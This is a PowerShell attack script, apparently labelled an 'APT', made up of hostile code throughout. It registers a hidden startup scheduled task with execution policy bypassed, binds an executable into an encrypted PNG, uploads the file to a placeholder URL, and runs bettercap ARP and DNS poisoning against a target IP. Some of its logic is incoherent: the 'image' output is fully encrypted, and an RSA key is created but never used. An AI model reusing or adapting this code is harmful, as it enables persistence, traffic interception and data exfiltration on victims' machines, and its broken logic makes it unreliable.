Add-Type -TypeDefinition @"
using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

public class CryptoHelper {
    public static byte[] GenerateAESKey() {
        using (var aes = Aes.Create()) {
            aes.KeySize = 256;
            aes.GenerateKey();
            return aes.Key;
        }
    }

    public static byte[] EncryptAES(byte[] data, byte[] key, byte[] iv) {
        using (var aes = Aes.Create()) {
            aes.Key = key;
            aes.IV = iv;
            aes.Padding = PaddingMode.PKCS7;
            var encryptor = aes.CreateEncryptor();
            byte[] encryptedData;
            using (var ms = new MemoryStream()) {
                using (var cs = new CryptoStream(ms, encryptor, CryptoStreamMode.Write)) {
                    cs.Write(data, 0, data.Length);
                }
                encryptedData = ms.ToArray();
            }
            return encryptedData;
        }
    }

    public static byte[] EncryptRSA(byte[] data, RSA rsa) {
        return rsa.Encrypt(data, RSAEncryptionPadding.OaepSHA256);
    }

    public static byte[] GenerateIV() {
        var iv = new byte[16];
        using (var rng = RandomNumberGenerator.Create()) {
            rng.GetBytes(iv);
        }
        return iv;
    }
}
"@

function Set-Persistence {
    $scriptPath = $MyInvocation.MyCommand.Path
    $taskName = "StealthPersistence"
    $taskAction = "Powershell.exe"
    $taskArgs = "-ExecutionPolicy Bypass -File $scriptPath"
    $taskTrigger = New-ScheduledTaskTrigger -AtStartup
    $taskActionObj = New-ScheduledTaskAction -Execute $taskAction -Argument $taskArgs
    $taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
    Register-ScheduledTask -Action $taskActionObj -Trigger $taskTrigger -Settings $taskSettings -TaskName $taskName
}

function Generate-Keys {
    $AesKey = [CryptoHelper]::GenerateAESKey()
    $RsaKey = [System.Security.Cryptography.RSA]::Create()
    $publicKey = $RsaKey.ToXmlString($false)
    $privateKey = $RsaKey.ToXmlString($true)
    return @{ AesKey = $AesKey; RsaKey = $RsaKey }
}

function Encrypt-Payload {
    param([byte[]]$data, [byte[]]$aesKey)
    $iv = [CryptoHelper]::GenerateIV()
    $encryptedData = [CryptoHelper]::EncryptAES($data, $aesKey, $iv)
    return $iv + $encryptedData
}

function Bind-Exe-To-Png {
    param([string]$exeFile, [string]$pngFile, [byte[]]$aesKey)
    $exeData = [System.IO.File]::ReadAllBytes($exeFile)
    $pngData = [System.IO.File]::ReadAllBytes($pngFile)
    $boundData = $pngData + $exeData
    $encryptedData = Encrypt-Payload -data $boundData -aesKey $aesKey
    [System.IO.File]::WriteAllBytes('bound.png', $encryptedData)
}

function Send-Encrypted-Payload {
    param([string]$url, [string]$filePath, [byte[]]$aesKey)
    $fileData = [System.IO.File]::ReadAllBytes($filePath)
    $encryptedData = Encrypt-Payload -data $fileData -aesKey $aesKey
    $headers = @{
        "X-Custom-Header" = "SecureTransmission"
        "Content-Type" = "application/octet-stream"
    }
    $client = New-Object 'System.Net.Http.HttpClient'
    $content = New-Object 'System.Net.Http.ByteArrayContent' $encryptedData
    $response = $client.PostAsync($url, $content).Result
}

function Perform-Arp-Poisoning {
    param([string]$interface, [string]$targetIp, [string]$gatewayIp)
    $command = "bettercap -iface $interface --arp-poison $targetIp $gatewayIp"
    Invoke-Expression $command
}

function Perform-DnsCache-Poisoning {
    param([string]$interface, [string]$targetIp, [string]$dnsServerIp)
    $command = "bettercap -iface $interface --dns-poison $targetIp $dnsServerIp"
    Invoke-Expression $command
}

function Get-Public-IP {
    $url = "http://ifconfig.me/ip"
    $client = New-Object 'System.Net.WebClient'
    $publicIP = $client.DownloadString($url).Trim()
}

function Execute-APT {
    param([string]$exeFile, [string]$pngFile, [string]$url, [string]$interface, [string]$targetIp, [string]$gatewayIp, [string]$dnsServerIp)
    $keys = Generate-Keys
    $AesKey = $keys['AesKey']
    Set-Persistence
    Bind-Exe-To-Png -exeFile $exeFile -pngFile $pngFile -aesKey $AesKey
    Send-Encrypted-Payload -url $url -filePath "bound.png" -aesKey $AesKey
    Perform-Arp-Poisoning -interface $interface -targetIp $targetIp -gatewayIp $gatewayIp
    Perform-DnsCache-Poisoning -interface $interface -targetIp $targetIp -dnsServerIp $dnsServerIp
    Get-Public-IP
}

$exeFile = "path\to\your\exe\file.exe"
$pngFile = "path\to\your\image.png"
$url = "http://example.com/upload"
$interface = "eth0"
$targetIp = "192.168.1.100"
$gatewayIp = "192.168.1.1"
$dnsServerIp = "8.8.8.8"

Execute-APT -exeFile $exeFile -pngFile $pngFile -url $url -interface $interface -targetIp $targetIp -gatewayIp $gatewayIp -dnsServerIp $dnsServerIp